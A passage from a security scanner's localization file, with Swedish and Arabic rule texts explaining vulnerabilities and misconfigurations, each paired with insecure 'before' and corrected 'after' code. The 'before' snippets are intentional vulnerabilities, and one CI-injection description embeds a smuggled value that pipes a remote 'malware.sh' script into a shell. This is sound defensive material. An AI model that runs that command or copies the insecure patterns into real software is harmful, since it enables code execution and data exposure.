      'En "azurerm_role_assignment" tilldelar rollen "Owner" — full åtkomst, inklusive kontroll över andra användares behörigheter, över hela det tilldelade omfånget (prenumeration, resursgrupp...). Det kan vara avsett för ett nödkonto, men bör bekräftas: för vardaglig användning, ge endast den mer specifika roll som faktiskt behövs (t.ex. "Contributor" på en enda resursgrupp).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # endast den mer specifika roll som faktiskt behövs, inte Owner på hela prenumerationen\n}`,
    },
  },
  "weak-random-token": {
    title: "En säkerhetstoken genereras med en slumptalsgenerator som inte är kryptografiskt säker",
    description:
      "Ett värde med ett namn som token/session/reset/otp/csrf genereras med Math.random() (JS), random.random() (Python), eller rand() (PHP) — generatorer som inte är designade för säkerhet och vars sekvenser är förutsägbara. En token genererad på detta sätt kan gissas eller rekonstrueras, vilket omintetgör syftet den finns för (t.ex. en lösenordsåterställningslänk som vem som helst skulle kunna förutsäga).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, inte Math.random — oförutsägbar`,
    },
  },
  "ldap-injection": {
    title: "Ett LDAP-filter byggs genom att direkt konkatenera ett värde från förfrågan",
    description:
      'En rad som bygger ett LDAP-filter (t.ex. "(uid=...)") inkluderar direkt ett värde hämtat från förfrågan, utan någon escaping av LDAP-specialtecken. Den som kontrollerar det värdet kan ändra filtrets logik — till exempel kringgå en autentiseringskontroll eller läsa katalogdata de inte borde se.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-specialtecken måste alltid escapas innan de används i ett filter\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Ett värde från förfrågan hamnar direkt i ett HTTP-svarshuvud",
    description:
      "Ett HTTP-svarshuvud sätts med ett värde hämtat direkt från förfrågan (query, body, params), utan att kontrollera att det inte innehåller en radbrytning (CRLF). En angripare kan infoga ytterligare huvuden eller till och med ett helt annat svar — response splitting — vilket potentiellt kan manipulera cachning, cookies eller innehållet som visas för andra användare.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "En tredjepartsåtgärd i CI:n är inte låst till en exakt version (commit SHA)",
    description:
      'Workflowt använder en tredjepartsåtgärd refererad via tagg eller gren (t.ex. "@v1", "@main") istället för commit SHA. Den som underhåller den — eller den som komprometterar deras konto — kan flytta den referensen till en annan commit när som helst, och tyst ändra vad som körs i CI:n, med åtkomst till dess hemligheter. En commit SHA pekar alltid på exakt samma kod.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, låst till commit SHA — uppdatera SHA:n när du uppdaterar versionen`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflowt ger sig självt alla token-behörigheter istället för bara de som används",
    description:
      '"permissions: write-all" ger workflowts GITHUB_TOKEN skrivåtkomst till allt — issues, pull requests, paket, driftsättningar — även om workflowt bara använder en del av det. Om ett steg i workflowt komprometteras (ett skadligt beroende, ett injicerat skript) ökar de bredare behörigheterna vad den som utnyttjar det kan göra.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # endast de behörigheter workflowt faktiskt använder`,
    },
  },
  "insecure-cookie-flags": {
    title: "En sessions- eller autentiseringscookie sätts utan flaggorna Secure och HttpOnly",
    description:
      'En cookie med ett namn som liknar session/auth/token sätts utan "httpOnly" och "secure" bland sina alternativ. Utan httpOnly kan JavaScript på sidan — inklusive kod injicerad via XSS — läsa den cookien. Utan secure kan den också skickas över en okrypterad HTTP-anslutning.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Sårbart beroende:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ingen korrigerad version känd ännu — överväg ett alternativt paket eller följ projektets uppdateringar."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "En hemlighet är skriven direkt i en ENV- eller ARG-instruktion i Dockerfilen",
    description:
      "En variabel med ett namn som password/secret/token/key har ett bokstavligt värde i en ENV- eller ARG-instruktion. Till skillnad från en .env-fil (som normalt inte hamnar i avbildningen) bakas detta värde in i själva Docker-avbildningen — vem som helst som kan hämta den eller inspektera lagerhistoriken kan återvinna det, även om raden tas bort i en senare version av Dockerfilen.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# skickas med: docker build --build-arg DB_PASSWORD=*** (eller, ännu hellre,\n# en BuildKit secret mount, som aldrig hamnar i lagerhistoriken)`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfilen anger ingen icke-root-användare",
    description:
      "Ingen USER-instruktion i Dockerfilen: utan en körs containern som root. Om en angripare lyckas köra kod inuti containern (t.ex. genom att utnyttja ett sårbart bibliotek) gör root inuti containern en flykt till värden — eller en bredare påverkan på det omgivande systemet — enklare.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfilens basavbildning använder taggen ":latest"',
    description:
      'En FROM-instruktion använder uttryckligen taggen ":latest" istället för en exakt version. "latest" ändras över tid: samma build, omgjord vid en annan tidpunkt, kan få en annan version av basavbildningen — en icke-reproducerbar build, och en oönskad uppdatering kan komma utan att någon har beslutat att den ska.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfilen laddar ner en fjärrfil med ADD istället för COPY",
    description:
      "En ADD-instruktion med en http/https-URL laddar ner en fil från internet under builden, utan integritetskontroll och med innehållet osynligt i repot. Om den URL:en någonsin komprometteras drar builden in godtyckligt innehåll utan att någon märker det bara genom att läsa Dockerfilen.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "En container i Kubernetes-manifestet körs som privilegierad",
    description:
      '"privileged: true" i en containers securityContext inaktiverar nästan all vanlig isolering mellan container och värd: containern kan komma åt värdens enheter, ändra dess nätverkskonfiguration, och i många fall effektivt få root-åtkomst till maskinen som kör den. Nästan aldrig nödvändigt för en vanlig app.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # endast de capabilities som faktiskt behövs`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "En hemlighet är skriven i klartext i en miljövariabel i Kubernetes-manifestet",
    description:
      'En miljövariabel med ett namn som password/secret/token/key har ett bokstavligt värde ("value:") istället för att läsas från en Secret ("valueFrom.secretKeyRef"). Manifestet självt — ofta sparat i ett repo — innehåller därför hemligheten i klartext, synlig även för någon som bara kan läsa konfigurationen, inte nödvändigtvis köra kommandon i klustret.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "En container i Kubernetes-manifestet är inställd på att köras som root",
    description:
      '"runAsUser: 0" eller "runAsNonRoot: false" i securityContext tvingar uttryckligen containern att köras som root. Om en angripare lyckas köra kod inuti containern (t.ex. genom att utnyttja ett sårbart bibliotek) gör root inuti containern en flykt till värden — eller en bredare påverkan — enklare.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "En container i Kubernetes-manifestet kan få fler privilegier än den startade med",
    description:
      '"allowPrivilegeEscalation: true" i securityContext låter en process inuti containern få fler privilegier än processen som startade den (t.ex. genom en setuid-binär). Kombinerat med en sårbarhet i applikationen är det ytterligare ett steg mot att köra kod med fler privilegier än avsett.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "En pod i Kubernetes-manifestet delar värdens nätverk, processer eller delat minne",
    description:
      '"hostNetwork", "hostPID" eller "hostIPC" satt till true tar bort poden från dess normala isolering: hostNetwork exponerar poden på värdens nätverk (och kringgår klustrets nätverkspolicyer), hostPID ger den insyn i varje process på värdmaskinen, hostIPC ger den åtkomst till värdens delade minne. Nästan aldrig nödvändigt för en vanlig app — vanligtvis bara för lågnivå-system-/övervakningsverktyg.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes-manifestet tvingar inte uttryckligen körning som en icke-root-användare",
    description:
      'Inget "runAsNonRoot" någonstans i manifestet (varken på pod- eller containernivå): utan att sätta det körs en container som vilken användare dess avbildning än definierar — ofta root som standard, om avbildningen själv inte har ändrat det. Att sätta det uttryckligen till true gör att poden misslyckas med att starta om avbildningen fortfarande försöker köras som root, istället för att man bara upptäcker det efter en incident.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
},
  ar: {
  "supabase-service-role-in-client": {
    title: "مفتاح Supabase السري ينتهي في ملف مخصص للمتصفح",
    description:
      "متغيّر ببادئة عامة (مثل NEXT_PUBLIC_، VITE_) أو ملف من جهة العميل يشير إلى مفتاح دور الخدمة (service role key) الخاص بـ Supabase. هذا المفتاح يتجاوز Row Level Security: إذا انتهى داخل حزمة المتصفح، يمكن لأي شخص قراءته والتصرف كمسؤول على قاعدة البيانات.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (الخادم فقط)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "هناك كلمات مرور أو مفاتيح سرية مكتوبة مباشرة داخل الكود",
    description:
      "يبدو أن مفتاح API أو رمزًا (token) أو كلمة مرور مكتوبة كقيمة حرفية بدلاً من قراءتها من متغيّر بيئة. أي شخص يقرأ الكود المصدري (أو المستودع، إن كان عامًا) يحصل على ذلك السر.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "هناك ملف يحتوي على كلمات المرور الحقيقية للمشروع ضمن الملفات التي جرى تحليلها",
    description:
      "ملف .env بقيم حقيقية (وليس .env.example) مُدرج ضمن التحليل. إذا انتهى هذا الملف في مستودع أو في نشر عام، تصبح كل بيانات الاعتماد التي يحتويها مكشوفة.",
    fix: {
      before: `# .env (تم تضمينه بالخطأ)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (مُضمَّن)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env يبقى خارج المستودع (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "يمكن لأي شخص قراءة أو تعديل بيانات جميع المستخدمين",
    description:
      "ميزة Row Level Security معطّلة، أو أن سياسة (policy) تسمح بالوصول لأي شخص (USING (true)) دون التحقق من هوية من يقوم بالطلب. يمكن لكل مستخدم موثّق — أو حتى مجهول — قراءة أو تعديل بيانات بقية المستخدمين.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "قيمة أدخلها المستخدم تُلصق مباشرة داخل استعلام قاعدة بيانات",
    description:
      "استعلام SQL يُبنى عن طريق دمج أو إدراج سلسلة نصية مباشرة بدلاً من استخدام المعاملات (parameters). إذا كان هذا النص قادمًا — ولو بشكل غير مباشر — من مستخدم، يمكنه تغيير الاستعلام نفسه — حقن SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "كلمات المرور لا يبدو أنها محمية",
    description:
      "حقل كلمة المرور يُحفظ تمامًا كما وصل في الطلب، ولا تظهر أي دالة تجزئة (bcrypt، argon2، scrypt) في الملف. إذا تم اختراق قاعدة البيانات، تصبح كل كلمة مرور قابلة للاستخدام فورًا.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "السر المستخدم لتوقيع تسجيلات الدخول مكتوب نصًا صريحًا داخل الكود",
    description:
      "السر الممرَّر إلى jwt.sign / jwt.verify (أو متغيّر JWT_SECRET) هو قيمة حرفية في الكود بدلاً من أن يأتي من متغيّر بيئة. أي شخص يقرأه يمكنه إنشاء رموز وصول (tokens) صالحة لأي مستخدم.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "يمكن إجبار الخادم على تنفيذ أوامر خارجية",
    description:
      "دالة تنفّذ أوامر النظام (exec، execSync، spawn) تستقبل سلسلة نصية مبنية بالإدراج أو الدمج. إذا كان جزء من تلك السلسلة قادمًا من مُدخلات المستخدم، فبإمكان من يتحكم بها تنفيذ أوامر عشوائية على الخادم.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "يبدو أن جدولاً جديدًا أُنشئ دون حماية",
    description:
      "ترحيل (migration) SQL ينشئ جدولاً لكنه لا يفعّل Row Level Security لهذا الجدول نفسه في نفس الملف. طالما بقي الأمر كذلك، يبدأ الجدول دون أي قيد على من يمكنه قراءته أو الكتابة فيه.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "الموقع يقبل طلبات من أي موقع آخر",
    description:
      "رأس CORS مضبوط لقبول الطلبات من أي مصدر (*)، أو أن middleware الخاص بـ cors() مستخدَم دون قيود. يمكن لأي موقع خارجي استدعاء واجهات برمجة التطبيقات (APIs) الخاصة بك من متصفح مستخدم تم تسجيل دخوله بالفعل.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "دالة بصلاحيات إدارية لا تتحقق من هوية من يستخدمها",
    description:
      "مسار أو دالة يوحي اسمها بعمليات إدارية لا يحتوي، في الأسطر القريبة، على أي تحقق من المصادقة أو الدور. أي شخص يعرف الرابط يمكنه تشغيلها.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "يمكن إجبار الموقع على تنفيذ كود خارجي",
    description:
      "طلب HTTP صادر (fetch، axios) يستخدم مباشرة قيمة قادمة من طلب المستخدم كعنوان URL للوجهة. يمكن لمستخدم خبيث جعل خادمك يستدعي عناوين داخلية أو عشوائية — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("عنوان URL غير مسموح به")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "كلمات المرور محمية بأسلوب أصبح من السهل كسره الآن",
    description:
      "في السطر نفسه، تُطبَّق md5() أو sha1() على قيمة مرتبطة بكلمة مرور. هذه الخوارزميات سريعة جدًا في الحساب: يمكن لمهاجم يملك قاعدة البيانات تجربة مليارات كلمات المرور في الثانية.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "نص كتبه المستخدمون قد ينفّذ كودًا في المتصفح",
    description:
      "يُدرج محتوى في الصفحة كـ HTML خام (dangerouslySetInnerHTML، v-html، .innerHTML) بدلاً من نص عادي. إذا كان ذلك المحتوى يتضمن مُدخلات مستخدم، فقد يحتوي على سكربتات تُنفَّذ في متصفح من يقرأ الصفحة.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// أو، إذا احتجت HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "مساحة الملفات المرفوعة مرئية لأي شخص",
    description:
      "دلو تخزين (storage bucket — Supabase Storage، S3) مُهيَّأ كعام (public). إذا كان يحتوي على مستندات أو صور أو ملفات رفعها المستخدمون، فإن أي شخص يعرف — أو يخمّن — المسار يمكنه الوصول إليها دون أي مصادقة.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// قدّم الملفات عبر روابط موقَّعة محدودة المدة: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "رابط واحد يكفي لحذف البيانات أو تعديلها",
    description:
      "مسار GET يقوم بعملية تغيّر البيانات (المسار يحتوي على delete/remove/update/edit). طلبات GET تُنفَّذ بمجرد زيارة رابط أو تحميل صورة من موقع خارجي — نقطة الانطلاق الكلاسيكية لهجوم CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "بيانات تسجيل الدخول المحفوظة في المتصفح غير محمية جيدًا",
    description:
      "رمز وصول (access token) يُحفظ في localStorage. على عكس cookie من نوع httpOnly، يمكن لأي سكربت يعمل في الصفحة — بما في ذلك سكربت خبيث حُقن عبر XSS — قراءته وسرقته.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// عيّن الرمز كـ cookie من نوع httpOnly من جهة الخادم:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "يمكن استخدام الموقع لإعادة التوجيه إلى موقع احتيالي",
    description:
      "يعيد الموقع توجيه المستخدم إلى عنوان مأخوذ مباشرة من الطلب (query، body، params) دون التحقق من كونه نطاقًا معروفًا. رابط يبدو وكأنه يشير إلى موقعك قد يؤدي فعليًا إلى صفحة تصيّد احتيالي.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "تغيير رقم في العنوان قد يُظهر بيانات مستخدم آخر",
    description:
      "استعلام قاعدة بيانات يستخدم مباشرة معرّفًا (identifier) مأخوذًا من الرابط (req.params.id) دون التحقق، في الأسطر القريبة، من أنه يخص المستخدم الذي يقوم بالطلب. تغيير الـ id في العنوان قد يتيح الوصول إلى بيانات مستخدم آخر — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "نموذج تسجيل الدخول لا يحظر المحاولات المتكررة",
    description:
      "مسار تسجيل الدخول معرَّف في الملف، لكن لا أثر لأي middleware لتحديد معدل الطلبات (rate limiting) في الملف نفسه. دون حد أقصى للمحاولات، يمكن لمهاجم تجربة كلمات مرور بالتتابع (brute force) دون أي تباطؤ.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "كلمات مرور أو بيانات حساسة تنتهي في السجلات (logs)",
    description:
      "استدعاء لـ console.log (أو ما شابه) يتضمن متغيّرًا باسم password أو token أو secret أو apiKey. إذا انتهت هذه السجلات في خدمة خارجية أو ملف، تبقى البيانات الحساسة مكشوفة لمدة أطول بكثير من اللازم.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "يمكن قراءة أو كتابة ملف على الخادم عبر اختيار المسار من الخارج",
    description:
      'دالة تقرأ أو تكتب أو ترسل ملفًا تستقبل المسار مباشرة من قيمة في الطلب (query، body، params) دون التحقق من بقائه داخل مجلد مسموح به. يمكن لمهاجم إدراج "../" للخروج من المجلد المقصود وقراءة أو الكتابة فوق ملفات عشوائية على الخادم (مثل ملف إعدادات يحتوي على بيانات اعتماد).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("المسار غير مسموح به")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "قيمة أدخلها المستخدم تُنفَّذ كأنها كود داخل استعلام MongoDB",
    description:
      "عامل $where في MongoDB ينفّذ كود JavaScript من جهة الخادم لكل مستند — إذا كانت تلك السلسلة النصية مبنية عبر دمج قيمة قادمة من المستخدم، فإن من يتحكم بها يمكنه تنفيذ كود عشوائي ضمن سياق قاعدة البيانات، وليس فقط تغيير الفلتر كما في حقن SQL العادي.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "قيمة أدخلها المستخدم تُفسَّر كقالب (template)، وليس كبيانات",
    description:
      "دالة تقوم بترجمة/تنفيذ قالب تستقبل القالب بأكمله من قيمة في الطلب، بدلاً من استخدام قالب ثابت وتمرير البيانات فقط. يمكن لمهاجم الكتابة مباشرة بصيغة محرك القوالب (مثل {{7*7}} في Jinja2) وتنفيذ كود على الخادم — Server-Side Template Injection، وغالبًا ما يؤدي إلى تنفيذ أوامر عشوائية، وليس مجرد مشكلة عرض كما في XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "يمكن إجبار محلّل XML على قراءة ملفات أو إجراء طلبات خارجية",
    description:
      "يتم إنشاء محلّل XML (DocumentBuilderFactory) دون تعطيل الكيانات الخارجية (DOCTYPE) صراحةً في الأسطر القريبة. إذا استقبل المحلّل XML من مصدر غير موثوق، يمكن لمهاجم تعريف كيان خارجي لقراءة ملفات على الخادم أو جعله يتواصل مع عنوان من اختياره — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "مجموعة أمان (security group) في Terraform تفتح منفذًا حساسًا على الإنترنت بأكمله",
    description:
      'قاعدة تحتوي على "cidr_blocks" تشمل 0.0.0.0/0 (أي عنوان IP) قريبة من منفذ حساس — SSH (22)، RDP (3389)، أو منفذ قاعدة بيانات شائع (MySQL، Postgres، MongoDB، Redis، SQL Server). يمكن لأي شخص على الإنترنت محاولة الاتصال بتلك الخدمة، وليس فقط من ينبغي له ذلك.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # فقط شبكتك الخاصة، أو مضيف bastion\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "قاعدة جدار حماية في Google Cloud تفتح منفذًا حساسًا على الإنترنت بأكمله",
    description:
      'مورد "google_compute_firewall" بخاصية "source_ranges" تشمل 0.0.0.0/0 (أي عنوان IP) يسمح بالمرور نحو منفذ حساس — SSH (22)، RDP (3389)، أو منفذ قاعدة بيانات شائع (MySQL، Postgres، MongoDB، Redis، SQL Server). يمكن لأي شخص على الإنترنت محاولة الاتصال بتلك الخدمة، وليس فقط من ينبغي له ذلك.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # فقط شبكتك الخاصة، أو مضيف bastion\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "قاعدة شبكة في Azure تفتح منفذًا حساسًا على الإنترنت بأكمله",
    description:
      'قاعدة أمان شبكة ("azurerm_network_security_rule"، أو كتلة "security_rule" داخل "azurerm_network_security_group") بخاصية "source_address_prefix" تساوي "*" أو "0.0.0.0/0"، باتجاه "Inbound" ووصول "Allow"، قريبة من منفذ حساس — SSH (22)، RDP (3389)، أو منفذ قاعدة بيانات شائع. يمكن لأي شخص على الإنترنت محاولة الاتصال بتلك الخدمة، وليس فقط من ينبغي له ذلك.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # فقط شبكتك الخاصة، أو مضيف bastion\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "سر مكتوب كقيمة افتراضية لمتغيّر Terraform",
    description:
      'متغيّر باسم يشبه password/secret/token/key له قيمة حرفية في خاصيته "default". على عكس قيمة تُمرَّر وقت التشغيل (tfvars، متغيرات بيئة TF_VAR_*)، القيمة الافتراضية تنتهي في الكود المصدري — وإذا كان المستودع مشتركًا أو عامًا، يمكن لأي شخص رؤيتها، حتى دون الوصول إلى حالة Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # بلا قيمة افتراضية: يجب تمريرها عبر ملف .tfvars (خارج git) أو متغيّر بيئة TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "قيمة يتحكم بها مستخدم خارجي تدخل مباشرة في أمر shell ضمن CI",
    description:
      'أمر "run:" في سير عمل GitHub Actions يُدرج مباشرة قيمة مثل عنوان طلب سحب (pull request)، أو اسم فرع، أو نص تعليق — وكلها قابلة للكتابة من أي شخص يفتح طلب سحب أو تعليقًا، حتى من fork خارجي. قيمة مثل `"; curl malware.sh | sh #` ستنفّذ أوامر عشوائية في CI، مع إمكانية الوصول إلى كل الأسرار المتاحة في ذلك السير.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # يُمرَّر كمتغيّر بيئة، ولا يُدرَج مباشرة داخل الأمر أبدًا`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "سير العمل ينفّذ كود طلب سحب خارجي مع إمكانية الوصول إلى أسرار المستودع",
    description:
      'يستخدم سير العمل "pull_request_target" — الذي يعمل بصلاحيات وأسرار المستودع الأساسي حتى لطلب سحب مفتوح من fork غير مرتبط — وينفّذ checkout لكود طلب السحب نفسه ("github.event.pull_request.head")، وليس للفرع الأساسي. من يفتح طلب السحب يحصل فعليًا على تنفيذ كوده الخاص مع إمكانية الوصول إلى تلك الأسرار.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
